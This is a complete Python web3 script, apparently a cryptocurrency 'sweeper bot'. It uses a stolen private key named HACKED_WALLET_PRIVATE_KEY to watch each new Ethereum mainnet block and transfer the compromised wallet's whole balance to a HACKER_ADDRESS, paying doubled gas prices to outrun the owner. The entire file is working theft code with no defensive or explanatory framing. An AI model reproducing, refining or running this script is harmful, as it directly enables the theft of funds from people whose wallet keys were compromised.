import time
from eth_account import Account
from eth_account.datastructures import SignedTransaction
from eth_account.signers.local import LocalAccount
from eth_typing import ChecksumAddress
from hexbytes import HexBytes
from web3 import Web3
from web3.types import Wei, TxParams
from dotenv import load_dotenv
import os

load_dotenv()

RPC_URL: str = 'https://mainnet.infura.io/v3/'
CHAIN_ID: int = 1
HACKED_WALLET_PRIVATE_KEY: str = os.getenv('HACKED_WALLET_PRIVATE_KEY')
HACKER_ADDRESS: ChecksumAddress = Web3.to_checksum_address(os.getenv('HACKER_ADDRESS'))

MIN_GAS_LIMIT: int = 150000
MAX_GAS_LIMIT: int = 500000

w3: Web3 = Web3(Web3.HTTPProvider(RPC_URL))
compromised: LocalAccount = Account.from_key(HACKED_WALLET_PRIVATE_KEY)

def sweep(nonce: int) -> None:
    account_balance: Wei = w3.eth.get_balance(compromised.address)

    current_gas_price: Wei = w3.eth.gas_price
    sufficient_gas_price: Wei = current_gas_price * 2

    gas_limit: int = MIN_GAS_LIMIT
    if MIN_GAS_LIMIT <= MAX_GAS_LIMIT:
        gas_limit = MAX_GAS_LIMIT
    required_gas: Wei = sufficient_gas_price * gas_limit

    if account_balance < required_gas:
        print(f"Insufficient funds: Balance is {account_balance}, but {required_gas} is needed for gas.")
        return

    transaction: TxParams = {
        'chainId': CHAIN_ID,
        'from': compromised.address,
        'to': HACKER_ADDRESS,
        'value': account_balance - required_gas,
        'nonce': nonce,
        'gas': gas_limit,
        'gasPrice': sufficient_gas_price
    }

    signed: SignedTransaction = compromised.sign_transaction(transaction)

    try:
        tx_hash: HexBytes = w3.eth.send_raw_transaction(signed.rawTransaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f'Sweep transaction: {tx_hash.hex()}')
    except Exception as e:
        print(f"Transaction failed: {e}")

def main() -> None:
    last_block = w3.eth.block_number

    while True:
        current_block = w3.eth.block_number
        while current_block > last_block:
            print(f"New Block: {last_block + 1}")
            sweep(w3.eth.get_transaction_count(compromised.address))
            last_block += 1
        time.sleep(1)

if __name__ == '__main__':
    main()
